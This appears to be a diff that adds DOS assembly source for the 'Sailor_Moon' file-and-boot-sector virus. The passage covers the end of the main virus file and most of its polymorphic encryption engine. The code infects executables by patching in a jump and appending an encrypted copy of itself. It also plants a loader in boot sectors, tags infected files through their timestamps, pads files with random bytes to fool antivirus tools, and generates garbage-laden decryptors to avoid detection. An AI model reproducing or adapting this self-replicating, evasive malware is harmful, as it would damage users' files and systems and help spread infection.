+                                                ; virus jump
+
+		mov     ah,3Fh
+		mov     cx,3
+		mov     dx,offset host_bytes_cmp
+                int     21h                     ; Read the bytes that will
+                                                ; be overwritten by the
+                                                ; virus jump
+
+		mov     si,offset host_bytes
+		mov     di,offset host_bytes_cmp
+		mov     cx,3
+                repe    cmpsb                   ; Check if the selected
+                                                ; instruction is really
+                                                ; present in the file in
+                                                ; that position. If the
+                                                ; file is compressed the
+                                                ; check will fail
+		jz      file_not_compressed
+
+		jmp     close_infect
+
+file_not_compressed:
+                mov     ax,ds:file_time         ; Get file time
+                and     ax,1Fh                  ; Get only seconds
+                cmp     ax,5                    ; Are the seconds 5?
+
+		jb      loc2_infect
+                cmp     ax,6                    ; Are the file seconds
+						; 6?
+		ja      loc2_infect
+                inc     ax                      ; If yes, increment by
+						; 1
+		jmp     loc3_infect
+loc2_infect:
+                mov     ax,5                    ; Otherwise set to 5
+loc3_infect:
+                and     ds:file_time,0FFE0h     ; Delete original file
+                                                ; seconds
+                or      ds:file_time,ax         ; Put the new ones
+
+		mov     ax,4200h
+		xor     cx,cx
+		mov     dx,ds:call_position
+                int     21h                     ; Point to the position of
+                                                ; the virus jump
+
+		mov     ax,ds:virus_position
+		sub     ax,ds:call_position
+		sub     ax,3
+                mov     ds:call_virus_offset,ax ; Calculate the lenght of
+                                                ; the jump needed to
+                                                ; reach the virus
+
+		push    bx
+		mov     ah,62h
+                int     21h                     ; Ask host segment
+
+		dec     bx
+		mov     ds,bx
+		mov     ax,ds:[10h + 2]
+sub ax,(offset virus_disc_end-offset virus_start+0A00h)/10h+1
+		mov     es,ax
+		pop     bx
+
+		push    cs
+		pop     ds
+
+		mov     ah,40h
+		mov     cx,3
+		mov     dx,offset call_virus
+                int     21h                     ; Write virus jump
+
+		mov     ax,4200h
+		xor     cx,cx
+		mov     dx,ds:virus_position
+                int     21h                     ; Point the file to the
+                                                ; position where the virus
+                                                ; will be written
+loop1_create_poly_file:
+		push    cs
+		pop     ds
+
+                mov     al,2                    ; Generate file code
+		mov     cx,offset virus_disc_end - offset virus_start
+		mov     dx,offset virus_start
+                call    poly                    ; Call the poly engine
+
+		mov     ah,40h
+                int     21h                     ; Write the virus at host
+
+		mov     ax,40h
+		mov     ds,ax
+		in      al,40h                  ; AL = random
+		mov     ah,0
+		mov     cx,ax                   ; 0 < CX < 255
+
+		mov     ah,40h
+		xor     dx,dx
+                int     21h                     ; Write some random bytes
+                                                ; at the host tail to fool
+                                                ; antiviruses
+
+		push    cs
+		pop     ds
+		push    cs
+		pop     es
+
+close_infect:
+		mov     ax,5701h
+		mov     cx,ds:file_time
+		mov     dx,ds:file_date
+                int     21h                     ; Set file date
+
+		mov     ah,3Eh
+                int     21h                     ; Close the file
+
+		mov     ax,4301h
+		mov     cx,ds:file_attrib
+		mov     dx,offset file_name
+                int     21h                     ; Restore file attributes
+
+exit_infect:
+		mov     ax,2524h
+		mov     dx,ds:ip24
+		mov     ds,ds:cs24
+                int     21h                     ; Restore Int 24h vector
+
+		jmp     exit_trace
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Int 24h Handler
+
+int_24_entry:
+		mov     al,3
+                iret                            ; If error occours
+                                                ; automatically leave
+                                                ; the operation
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; The loader that is inserted in the infected boot
+
+loader          label
+
+loader1         label
+		jmp     short $ + pos_loader
+		nop
+
+loader2         label
+		cli
+		xor     ax,ax
+		mov     ss,ax
+                mov     sp,7C00h                ; Incialize the stack
+                push    dx                      ; Save DX because it
+                                                ; contains the drive from
+                                                ; which the boot has been
+                                                ; executed
+
+loader3         label
+		pop     dx
+		push    cs
+		pop     ds
+		push    cs
+		pop     es
+
+		sti
+		cld
+
+                cmp     dl,80h                  ; Is booting from the
+						; hard disk?
+		jne     loc1_loader
+
+                mov     cx,2                    ; Cylinder 0 / Sector 2
+		mov     dh,0                    ; Side 0
+		jmp     loc2_loader
+loc1_loader:
+		mov     cx,4F01h                ; Cylinder 79 / Sector 1
+		mov     dh,1                    ; Side 1
+		jmp     loc2_loader
+loc2_loader:
+loop1_loader:
+mov ax,200h+(offset virus_disc_end-offset virus_start+0A00h+1FFh)/200h
+						; Read sectors
+		mov     bx,7C00h + 200h
+                int     13h                     ; Read the original boot
+                                                ; and the virus body
+		jc      loop1_loader
+
+		add     bx,200h
+                jmp     bx                      ; Execute the virus body
+
+loader4         label
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Int 13h with retry
+
+int13_retry:
+		push    ax
+		int     13h                     ; Do it
+		pop     ax
+		jnc     loc1_int13_retry        ; Error?
+		int     13h                     ; Then do it again
+loc1_int13_retry:
+		ret
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Original Int 13h with retry
+
+int13_orig_retry:
+		push    ax
+                pushf
+                call    dword ptr cs:ip13       ; Do it
+                pop     ax
+		jnc     loc1_int13_orig_retry   ; Error?
+                pushf
+		call    dword ptr cs:ip13       ; Then do it again
+loc1_int13_orig_retry:
+		ret
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Include the polymorphic engine
+
+include smpoly.asm
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+
+
+
+host_bytes      db      3 dup (?)               ; The original host 3
+                                                ; bytes overwritten by
+                                                ; the virus jump
+
+first_gen       db      1                       ; If 1 the virus assumes
+                                                ; it is a first generation
+                                                ; so it doesn't check the
+                                                ; checksum and doesn't
+                                                ; execute the host
+
+call_virus              db      0E8h            ; Jump to the virus (CALL)
+call_virus_offset       dw      ?               ; Offset of the virus jump
+
+
+                db      0,'Sailor_Moon',0
+                db      '-b0z0/iKx-'
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; End of the virus bytes on disk
+
+virus_disc_end  label
+
+host_bytes_cmp  db      3 dup (?)               ; Here are readed the 3
+                                                ; bytes that are
+                                                ; overwritten by the virus
+                                                ; jump to check if they
+                                                ; are really located there
+                                                ; and the file isn't
+                                                ; encrypted or compressed
+
+mz_counter      db      ?                       ; Goes from 3 a 0, is
+                                                ; used to wait that the
+                                                ; DOS is loaded before
+                                                ; hooking the Int 21h
+
+file_name       db      64 dup (?)              ; Buffer for the filename
+                                                ; of the file that is
+                                                ; being infected
+
+file_length     dw      ?                       ; File lenght
+
+file_buffer     db      32 dup (?)              ; First 32 bytes of the
+                                                ; file. Used by the
+                                                ; routine that inserts a
+                                                ; Int 3 at the start of
+                                                ; the host
+
+ip01            dw      ?
+cs01            dw      ?                       ; Int 1 vector
+
+ip03            dw      ?
+cs03            dw      ?                       ; Int 3 vector
+
+ip24            dw      ?
+cs24            dw      ?                       ; Int 24h vector
+
+host_segment    dw      ?                       ; Segment of the file that
+                                                ; we are going to infect
+
+inst_counter    dw      ?                       ; Numeber of instructions
+                                                ; that the virus will
+                                                ; execute before inserting
+                                                ; his own jump
+
+call_position   dw      ?                       ; Virus jump position
+
+virus_position  dw      ?                       ; Virus position in the
+                                                ; file that we are going
+                                                ; to infecting
+
+
+file_attrib     dw      ?                       ; Attibute of the file that
+                                                ; we are going to infect
+
+file_time       dw      ?                       ; File timestamp
+file_date       dw      ?                       ; File date
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Buffer for reading/writing a sector
+
+sector_buffer   db      200h dup (?)
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; End of the virus bytes in mem
+
+virus_mem_end   label
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; The end
+
+endp    sailormoon
+seg_a   ends
+end     start
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+[EOF]
+
+;=[END SMOON.ASM]============================================================
+
+
+
+;=[BEGIN SMPOLY.ASM]=========================================================
+;
+; Sailor_Moon Polymorphic engine
+; in:
+;    ES:0 = space to put the encrypted stuff
+;    CX = bytes to encrypt
+;    DS:DX = what we are going to encrypt
+;    AL = type of code to be generated. 2 = file, 1 = boot, 0 = loader
+;
+; out:
+;    CX,DI = lenght of the generated code
+;    DS:DX = encrypted code
+;    BX,ES = preserved
+;
+
+poly:
+        cld
+        push    bx
+        push    cx                              ; save a little of stuff
+        push    ds
+        push    dx
+        call    init_poly_engine
+        push    ax                              ; AL code to be generated
+        cmp     al,2                            ; file code?
+        jne     nofilecode
+        mov     byte ptr ds:[noints],00h        ; enable int generation
+        call    stage_one                       ; do pushes
+        jmp     goforenc
+nofilecode:
+        call    reset_registers
+goforenc:
+        mov     byte ptr ds:[push_nr],01h       ; less pushes
+        call    real_stuff                      ; do math decryption
+        pop     ax                              ; AL code to be generated
+        push    ax
+        cmp     al,2                            ; file?
+        jne     nofilecode_2
+        mov     word ptr ds:[nocx],000fh        ; reset cx and ints
+        mov     word ptr ds:[count_reg],0f0fh   ; reset used regs
+        mov     byte ptr ds:[push_nr],00h
+        call    stage_two                       ; do popps
+nofilecode_2:
+        pop     ax
+        cmp     al,00h                          ; loader?
+        je      loader_code
+        cmp     al,01h                          ; boot?
+        je      boot_code
+        mov     ax,word ptr ds:[virus_position] ; virus lenght
+        add     ax,100h                         ;  + is a com
+        jmp     pointer_calculation
+
+boot_code:
+        mov     byte ptr ds:[cmp_check2],01h    ; disable jumps
+        mov     dx,di           ; AX,lenght of the decryptor
+        and     dx,01111b       ; lenght dec must be /10h
+        jz      boot_aligned
+        cmp     dl,0dh
+        jae     fillwithonebyte
+        mov     cx,01
+        call    rerandom        ; do one random inst.
+        jmp     boot_code
+fillwithonebyte:
+        call    doonebyte
+        push    ax
+randomregi:
+        mov     bx,07h          ; change the INC/DEC ax to INC/DEC reg
+        mov     dx,bx
+        call    do_random
+        cmp     al,04h          ; no SP
+        je      randomregi
+        mov     cl,al
+        pop     ax
+        add     al,cl
+        stosb
+        jmp     boot_code
+boot_aligned:
+        mov     ax,8000h                        ; boot base offset
+        jmp     pointer_calculation
+loader_code:
+        mov     ax,7c50h                        ; loader offset
+pointer_calculation:
+        mov     si,word ptr ds:[pointer_di]     ; calculate pointer on code
+        add     ax,di
+        mov     word ptr es:[si],ax
+        pop     dx
+        pop     ds
+        pop     cx
+        call    copy_n_encrypt                  ; copy the code and encrypt
+        push    es
+        pop     ds
+        sub     dx,dx                           ; ds:dx = generated code
+        mov     cx,di                           ; cx=di=lenght
+        pop     bx
+        ret
+
+stage_one:
+        mov     al,09ch                         ; gen PUSHF
+        stosb                                   ; store it
+        sub     cx,cx
+nospall:
+        call    do_random_dx_0f
+        cmp     al,4
+        je      nospall                         ; no sp
+        mov     bx,ax
+        cmp     byte ptr ds:[registers+bx],0ffh ; already pushed ?
+        jne     nospall
+        mov     byte ptr ds:[registers+bx],cl   ; store sequence
+generation_loop:
+        add     al,050h                         ; PUSH reg
+        stosb                                   ; store the PUSH
+        push    cx
+        call    do_garbage                      ; put some garbage
+        pop     cx
+        inc     cx                              ; next register
+        cmp     cl,7                            ; all the regs done?
+        jae     pushing_end
+        jmp     nospall
+pushing_end:
+        mov     al,01eh                         ; PUSH DS
+        stosb
+        mov     cx,8h                           ; all regs may be used
+        call    do_garbage                      ; some garbage
+        ret
+
+do_garbage:
+        mov     bx,0fh                         ; max number of garbage i.
+        mov     dx,bx
+pung:
+        call    do_random       ; how much instructions
+        cmp     al,00h
+        je      pung            ; no 0 instruction allowed!
+        mov     cl,al
+        sub     ch,ch           ; CX = number of instructions to generate
+rerandom:
+do_the_random:
+        mov     dx,07                           ; used for the random gen
+        mov     bx,dx
+        call    do_random
+        cmp     al,04h                          ; no SP allowed
+        je      do_the_random
+        cmp     al,byte ptr ds:[count_reg]      ; don't change the counter
+        je      do_the_random
+        cmp     al,byte ptr ds:[point_reg]      ; don't change the pointer
+        je      do_the_random
+        cmp     al,byte ptr ds:[nocx]           ; no CX change if used
+        je      do_the_random
+        mov     bx,ax
+        cmp     byte ptr ds:[registers+bx],0ffh ; can we use that reg?
+        je      do_the_random
+        xchg    ah,al
+        mov     byte ptr ds:[reg8bits],0        ; reset 8 bit marker
+        call    select_instruction              ; generate the instuction
+        loop    rerandom                        ; with the selected reg.
+        ret
+
+select_instruction:
+        push    cx                              ; AH = destination register
+        push    ax
+        mov     si,offset instructions
+redorndin:
+        mov     bx,09h               ; 9 basic types of instructions
+        mov     dx,0fh               ; don't eliminate some
+        call    do_random            ; which instruction will we generate
+        cmp     al,byte ptr ds:[last_done]      ; try to change sometime
+        je      redorndin
+continue:
+        mov     byte ptr ds:[last_done],al      ; store type
+        add     si,ax                   ; point to the instr. in the table
+        cmp     ax,1                    ; which instruction
+        jbe     one_byte_instruction
+        cmp     ax,7
+        jb      no_3b
+        jmp     three_bytes_instruction
+no_3b:
+        cmp     ax,2                    ; which instruction
+        je      outta_here
+        cmp     ax,4
+        je      not_nop
+        cmp     ax,5
+        jb      outta_here
+        jmp     rolling
+outta_here:
+        mov     al,byte ptr ds:[si]
+        jae     finish_mate
+        push    ax
+calltheran:
+        call    do_random_dx_0f
+        mov     cl,al
+        cmp     cl,7                            ; is a compare?
+        jne     end_cmp_check
+        mov     byte ptr ds:[cmp_check],1       ; sign it.
+end_cmp_check:
+        pop     ax
+        call    instr_change
+finish_mate:
+        stosb                           ; instruction base oc
+        call    do_random_dx_0f
+        mov     cl,al
+        pop     ax
+        mov     al,0c0h                 ; op code for reg+instr
+        cmp     ah,04
+        jae     only16
+        push    ax
+        call    do_random_dx_0f         ; reg16 or reg8
+        mov     ch,al
+        pop     ax
+        ror     ch,1
+        jc      only16
+        dec     byte ptr es:[di-1]
+        ror     ch,1
+        jnc     only16
+        add     al,20h                  ; high 8 bits
+only16:
+        add     al,cl
+        mov     cl,ah
+        call    instr_change
+stor_chkjmp:
+        stosb
+        cmp     word ptr ds:[cmp_check],0001    ; encountered a cmp?
+        jne     not_comparing                   ; but out of a jmp region?
+        call    jumping_zone                    ; no, so do one
+not_comparing:
+        pop     cx
+        ret
+
+one_byte_instruction:
+        pop     ax
+        mov     al,byte ptr ds:[si]             ; dec/inc generation
+        add     al,ah
+        stosb
+        cmp     byte ptr ds:[registers],0ffh    ; is AX avaiable?
+        je      nocd21
+        call    do_random_dx_0f
+        cmp     al,05h                          ; INT 21h generation?
+        jb      nocd21
+        call    generate_int
+nocd21:
+        pop     cx
+        ret
+
+not_nop:
+        mov     al,0f7h                         ; not/neg
+        stosb
+        call    do_random_dx_0f
+        mov     cl,al
+        pop     ax
+        push    cx
+        mov     al,byte ptr ds:[si]             ; basic opcode
+        add     al,ah                           ; register dependant
+        shr     cl,1
+        jc      isneg
+        add     al,08h                          ; change to not
+isneg:
+        pop     cx
+        cmp     byte ptr ds:[push_nr],1         ; max pushes nested
+        ja      nopush
+        cmp     cl,2
+        jne     nopush
+        jmp     dopushpop                       ; do push
+nopush:
+        stosb
+        pop     cx
+        ret
+
+rolling:
+        mov     al,byte ptr ds:[si]
+        stosb                           ; rol/ror... base oc
+        mov     al,0c0h
+        call    do_random_dx_0f
+        mov     cl,al
+        pop     ax
+        cmp     cl,06h
+        jne     no_increment
+        inc     cl
+no_increment:
+        mov     al,0c0h                 ; the base
+        call    conv16to8               ; 8 or 16 bit instruction?
+        add     al,ah
+        call    instr_change
+        stosb                           ; write the reg/op dipendant byte
+        pop     cx
+        ret
+
+three_bytes_instruction:
+        cmp     ax,8                    ;mov reg,immediate
+        je      doalea
+        cmp     ax,9                    ;mov reg,[imm]
+        je      domemcp
+        mov     al,083h                 ; write the fixed first byte
+        stosb
+reget:
+        call    do_random_dx_0f         ; select which 3 bytes to do
+        mov     cl,al
+        cmp     cl,7
+        jne     end_cmp_imm_check
+        mov     byte ptr ds:[cmp_check],1
+end_cmp_imm_check:
+        mov     al,byte ptr ds:[si]
+        call    instr_change            ; generate instruction
+        mov     bl,al
+        pop     ax
+        mov     al,bl
+        call    conv16to8               ; 16 or 8 bit instruction?
+        add     al,ah
+        stosb
+        mov     bx,0ffh                 ; select the random immediate
+        mov     dx,bx
+        call    do_random
+        jmp     stor_chkjmp             ; check for cmp and store
+
+doalea:
+        mov     cl,0b8h
+        pop     ax
+        cmp     ah,4                    ; may we create a 8 bit mov?
+        jae     mov16breg               ; yeah, so select randomly which
+        push    ax
+        in      al,40h
+        ror     al,1
+        jnc     dowith16b
+        mov     byte ptr ds:[reg8bits],1
+        mov     cl,0b0h                 ; mov reg8_low,imm
+        ror     al,1
+        jnc     dowith16b
+        add     cl,4                    ; high 8 bits
+dowith16b:
+        pop     ax
+mov16breg:
+        mov     al,cl
+        add     al,ah
+        stosb                           ; mov reg,immediate
+        jmp     gen_mpos
+
+domemcp:
+        in      al,40h                  ; select segment
+        shr     al,1
+        jnc     no_seg_change           ; nc? only DS:
+        shr     al,1
+        jc      change_to_cs            ; c? put CS:
+        mov     al,026h                 ; nc? put ES:
+        stosb
+        jmp     no_seg_change
+change_to_cs:
+        mov     al,02eh                 ; CS:
+        stosb
+no_seg_change:
+        mov     al,08bh
+        stosb                           ; mov reg,seg:[imm]
+        pop     ax
+        mov     al,byte ptr ds:[si]
+        mov     cl,ah
+        call    instr_change
+        stosb
+
+gen_mpos:
+        mov     bx,03fffh                 ;select immediate
+        mov     dx,bx
+        call    do_random
+        stosb
+        xchg    al,ah
+        cmp     byte ptr ds:[reg8bits],1
+        je      no_2_imms               ; was an 8 bit instruction?
+        stosb
+no_2_imms:
+        pop     cx
+        ret
+
+do_random_dx_0f:
+        mov     bx,07h
+        mov     dx,bx
+do_random:
+        call    real_random
+        cmp     al,byte ptr ds:[last_random]    ; equal as last used?
+        jne     isokrandom
+        call    real_random
+isokrandom:
+        mov     byte ptr ds:[last_random],al
+        ret
+
+last_random     db      0ffh
+
+real_random:
+        in      al,40h
+        mov     ah,al
+        in      al,40h
+        ror     al,2
+        xor     al,ah
+        and     ax,dx
+        cmp     ax,bx
+        ja      real_random
+end_real_random:
+        ret
+
+instr_change:
+        cmp     cl,00h                  ; generate new instruction
+        je      finish_instr_change     ; based on input register.
+        add     al,08h
+        dec     cl
+        jmp     instr_change
+finish_instr_change:
+        ret
+
+conv16to8:
+        cmp     ah,4
+        jae     avante                  ; only from ax to dx
+        push    ax
+        call    do_random_dx_0f
+        mov     ch,al
+        ror     ch,1
+        pop     ax
+        jnc     avante                  ; do 8 or 16?
+        sub     byte ptr es:[di-1],1
+        ror     ch,1
+        jnc     avante
+        add     al,04                   ; low 8 bits or high 8?
+avante:
+        ret
+
+generate_int:
+        cmp     byte ptr ds:[noints],00h        ; may we interrupt?
+        je      realgenint
+exitingint:
+        ret
+realgenint:
+doint:
+        dec     di
+        mov     bx,0ah
+        mov     dx,0fh
+        call    do_random
+        mov     ch,al                           ; rnd in ch
+        mov     al,0b4h                         ; MOV ah,
+        cmp     byte ptr ds:[registers+1],0ffh
+        je      onlyahint
+        cmp     byte ptr ds:[registers+2],0ffh
+        je      onlyahint
+        cmp     byte ptr ds:[registers+3],0ffh
+        je      intwithacd
+        cmp     ch,4
+        jbe     intwithacd
+        cmp     ch,6
+        jbe     onlyahint
+        cmp     ch,9
+        ja      allocmem
+        cmp     ch,7
+        je      getpsp
+        mov     ah,30h                          ; dos version
+        jmp     storeandint
+getpsp:
+        mov     ah,62h                          ; get psp
+        jmp     storeandint
+allocmem:
+        mov     ah,48h                          ; allocate mem
+        stosw
+        mov     al,0bbh                         ; in bx max mem avaiable
+        stosb
+        sub     ax,ax
+        dec     ax                              ; bx=ffffh
+        jmp     storeandint
+intwithacd:
+        cmp     ch,1
+        jbe     systemdate
+        cmp     ch,3
+        jae     getbdrive
+        mov     ah,06h                          ; ah=06h
+        stosw
+        mov     al,0b2h                         ; mov dl
+        mov     ah,0ffh                         ; ffh
+        jmp     storeandint
+systemdate:
+        mov     ah,2ah                          ; get date
+        cmp     ch,0
+        je      notime
+        inc     ah                              ; time
+        inc     ah
+notime:
+        jmp     storeandint
+getbdrive:
+        mov     al,0b8h
+        stosb
+        mov     al,05h
+        mov     ah,33h
+        cmp     ch,4
+        je      storeandint
+        sub     al,al
+        mov     ah,058h
+        jmp     storeandint
+onlyahint:
+        mov     bx,02h
+        mov     dx,03h
+        push    ax
+        call    do_random
+        mov     ch,al
+        pop     ax
+okah:
+        cmp     ch,1
+        je      getcdrive
+        cmp     ch,2
+        je      getveryfl
+        mov     ah,0bh                          ; get stdin status
+        jmp     storeandint
+getveryfl:
+        mov     ah,054h                         ; get verify flag
+        jmp     storeandint
+getcdrive:
+        mov     ah,019h                         ; get default drive
+storeandint:
+        stosw
+        mov     ax,021cdh                       ; int 21h
+        stosw
+icantint:
+        ret
+
+dopushpop:
+        dec     di
+        inc     byte ptr ds:[push_nr]   ; increment the numba of pushes
+        push    ax
+        call    do_random_dx_0f
+        xchg    al,ah
+        mov     al,50h                  ; push a reg
+        add     al,ah
+        stosb
+        call    random_foo_instructions ; some shit between
+        pop     ax
+        mov     al,58h                  ; pop with the selected one
+        add     al,ah
+        stosb
+        pop     cx
+        dec     byte ptr ds:[push_nr]   ; number of pushes curr. active
+        ret
+
+jumping_zone:
+        mov     byte ptr ds:[cmp_check2],1      ; lock jumping
+        mov     bx,06h
+        mov     dx,07h
+        call    do_random
+        cmp     al,06h
+        jne     conditional_jump
+        mov     al,0ebh                         ; jmp short
+        jmp     store_jump
+conditional_jump:
+        mov     ah,al                           ; jmp type
+        mov     al,72h                          ; jmp base
+        add     al,ah
+store_jump:
+        stosb                                   ; write jmp
+        push    di
+        stosb                                   ; where will jump
+        call    random_foo_instructions
+        mov     ax,di
+        pop     di
+        push    ax
+        sub     ax,di
+        dec     ax
+        stosb                                   ; put the bytes to jump
+        pop     di
+        mov     byte ptr ds:[cmp_check],0       ; reset both checks
+        mov     byte ptr ds:[cmp_check2],0
+        ret
+
+random_foo_instructions:
+        call    do_random_dx_0f         ; how much foo
+        cmp     al,0
+        je      random_foo_instructions
+        mov     cl,al
+        sub     ch,ch
+        call    rerandom                ; generate foo instructions
+        ret
+
+real_stuff:                     ; this generates the decryptor
+        call    randomshit
+        mov     byte ptr ds:[noints],0fh        ; disable int generation
+rndget:
+        call    do_random_dx_0f
+        cmp     al,4
+        je      rndget
+        mov     byte ptr ds:[count_reg],al
+        mov     ah,al
+        mov     al,0b8h                         ; mov _reg16_,immediate
+        add     al,ah
+        stosb
+        call    do_random_dx_0f                 ; 0-2 ROR, 3-7 MATH
+        cmp     al,2
+        ja      nororing                        ; select if ror/rol of math
+        cmp     byte ptr es:[di-1],0b9h
+        je      nororing                        ; if using CX no rol/ror!
+        mov     byte ptr ds:[isrolror],01h      ; we'll ror/rol
+nororing:
+        ror     al,1
+        mov     ax,word ptr ds:[enc_lenght]     ; lenght
+        jc      notaword
+        mov     byte ptr ds:[isword],01h        ; word operation
+        inc     ax
+        shr     ax,1                            ; lenght in words
+notaword:
+        stosw                                   ; we will fill this later
+        call    randomshit                      ; shit stuff
+isntapnt:
+        call    do_random_dx_0f
+        cmp     al,03h                          ; select a pointer
+        jb      isntapnt
+        cmp     al,04h
+        je      isntapnt
+        cmp     al,byte ptr ds:[count_reg]      ; can't be same as counter
+        je      isntapnt
+        mov     byte ptr ds:[point_reg],al
+        mov     ah,al
+        mov     al,0b8h                 ; mov _reg16_,immediate
+        add     al,ah
+        stosb
+        mov     pointer_di,di           ; save pointer position
+        stosw
+        call    randomshit
+        cmp     byte ptr ds:[isrolror],00h
+        je      dontcl
+        mov     al,0b1h
+        stosb
+redorandom:
+        mov     bx,0fh                          ; how many rols/rors
+        mov     dx,bx
+        call    do_random
+        cmp     al,00h
+        je      redorandom
+        stosb
+        mov     byte ptr ds:[cl_move],al
+        mov     byte ptr ds:[nocx],01h
+        call    randomshit                      ; garbage
+dontcl:
+        mov     word ptr ds:[secphs],di         ; where we will jump
+        push    di
+        call    randomshit
+        pop     ax
+        ror     al,1
+        jc      withsegmentop
+        mov     al,0eh                          ; PUSH CS
+        stosb
+        call    randomshit
+        mov     al,1fh                          ; POP DS
+        stosb
+        call    randomshit
+        jmp     mathoperation
+withsegmentop:
+        mov     al,02eh                         ; CS:
+        stosb
+mathoperation:
+        cmp     byte ptr ds:[isrolror],00h
+        je      puremath
+        mov     al,0d2h                         ; ROL/ROR base byte
+        cmp     byte ptr ds:[isword],00
+        je      rolbyte
+        inc     al                              ; word = byte +1
+rolbyte:
+        stosb                                   ; first rol/ror byte
+        call    do_random_dx_0f
+        ror     al,1
+        mov     al,04h
+        jnc     rollinging
+        add     al,08h                          ; roring
+        mov     byte ptr [enc_loop+1],04h       ; encryptor always with SI
+        jmp     rolend
+rollinging:
+        mov     byte ptr [enc_loop+1],0ch       ; ROL/ROR base
+rolend:
+        cmp     byte ptr [point_reg],06h        ; ROL/ROR si?
+        je      finish_pointer_ro
+        inc     al
+        cmp     byte ptr [point_reg],07h        ; ROL/ROR di?
+        je      finish_pointer_ro
+        add     al,2
+        cmp     byte ptr [point_reg],03h        ; ROL/ROR bx?
+        je      finish_pointer_ro
+        add     al,03fh                         ; so it is bp
+        stosb
+        sub     al,al                           ; bp needs 1 byte more
+finish_pointer_ro:
+        stosb
+        jmp     nowordi
+puremath:
+        mov     al,080h                         ; ADD/SUB/XOR base
+        cmp     byte ptr ds:[isword],00h
+        je      goforbyte
+        inc     al                              ; word = byte +1
+goforbyte:
+        stosb
+        mov     bx,02h
+        mov     dx,03h
+        call    do_random                       ; select which
+        mov     cl,al
+        mov     al,34h
+        cmp     cl,00h
+        je      xoring
+        cmp     cl,01h
+        jne     subbing
+        sub     al,30h
+        mov     byte ptr [enc_loop+1],2ch       ; ADD
+        jmp     xoring
+subbing:
+        sub     al,08h
+        mov     byte ptr [enc_loop+1],04h       ; SUB
+xoring:
+        cmp     byte ptr [point_reg],06h        ; SI?
+        je      finish_pointer
+        inc     al
+        cmp     byte ptr [point_reg],07h        ; DI?
+        je      finish_pointer
+        add     al,2
+        cmp     byte ptr [point_reg],03h        ; BX?
+        je      finish_pointer
+        add     al,03fh                         ; well, BP!
+        stosb
+        sub     al,al                           ; bp needs 1 byte more
+finish_pointer:
+        stosb
+        in      al,40h
+        mov     byte ptr ds:[random_value],al
+        stosb                                  ; one random value
+        cmp     byte ptr ds:[isword],00h
+        je      nowordi                        ; encrypting words?
+        in      al,40h
+        mov     byte ptr ds:[random_value+1],al ; one more
+        stosb
+nowordi:
+        call    do_inc_pointer                  ; increment pointer
+        cmp     byte ptr ds:[isword],00h        ; is word?
+        je      noby
+        call    do_inc_pointer                  ; increment once more
+noby:
+        call    randomshit
+        mov     al,048h                         ; dec counter
+        add     al,byte ptr ds:[count_reg]
+        stosb
+        call    do_random_dx_0f                 ; CMP or no CMP?
+        shr     al,1
+        jnc     no_direct_ncmp
+        jmp     direct_ncmp
+no_direct_ncmp:
+        call    randomshit
+        mov     al,083h                         ; CMP
+        stosb
+        mov     al,0f8h
+        add     al,byte ptr ds:[count_reg]      ; CMP counter,
+        stosb
+        sub     al,al                           ; CMP counter,00
+        stosb
+direct_ncmp:
+        mov     al,74h                          ; JZ
+        stosb
+        mov     al,03h                          ; jump away
+        stosb
+        mov     al,0e9h                         ; JMP
+        stosb
+        mov     ax,di
+        inc     ax
+        sub     ax,word ptr ds:[secphs]         ; jump up
+        not     ax
+        stosw
+end_bjump:
+        ret
+
+randomshit:
+        mov     bx,0fh
+        mov     dx,bx
+        call    do_random                       ; how much shit
+        cmp     al,00h
+        je      randomshit
+        mov     cl,al
+        sub     ch,ch
+        call    rerandom                        ; do shit
+        ret
+
+stage_two:
+        call    do_garbage
+        mov     al,01fh                         ; POP DS
+        stosb
+        call    do_garbage
+        mov     cx,06h
+generation_loop_pop:                            ; do the POPs in the same
+        sub     bx,bx                           ; sequence as PUSHes
+        dec     bx
+next_reg:
+        inc     bx
+        cmp     byte ptr ds:[registers+bx],cl
+        jne     next_reg
+        mov     al,bl
+        mov     byte ptr ds:[registers+bx],0ffh
+        add     al,058h                         ; POP reg
+        stosb                                   ; put the POP
+        dec     cx
+        push    cx
+        call    do_garbage
+        pop     cx
+        jcxz    pre_popping_end
+        jmp     generation_loop_pop
+pre_popping_end:
+        mov     byte ptr ds:[cmp_check2],01h    ; disable jumps
+        sub     bx,bx
+        dec     bx
+search_loop:
+        inc     bx
+        cmp     byte ptr ds:[registers+bx],00h  ; search the last
+        jne     search_loop
+        push    bx
+        mov     ah,bl
+popping_end:
+        mov     dx,di                           ; AX decryptor lenght
+        inc     dx                              ; +1 for POP last
+        inc     dx                              ; +1 for POPf
+        and     dx,01111b
+        jz      file_aligned
+        cmp     dl,0dh
+        jae     fillwithob
+        mov     cx,01
+        push    ax
+        call    rerandom                        ; do one random inst.
+        pop     ax
+        jmp     popping_end
+fillwithob:
+        push    ax
+        call    doonebyte
+        mov     cl,al
+        pop     ax
+        mov     al,cl
+        add     al,ah
+        stosb
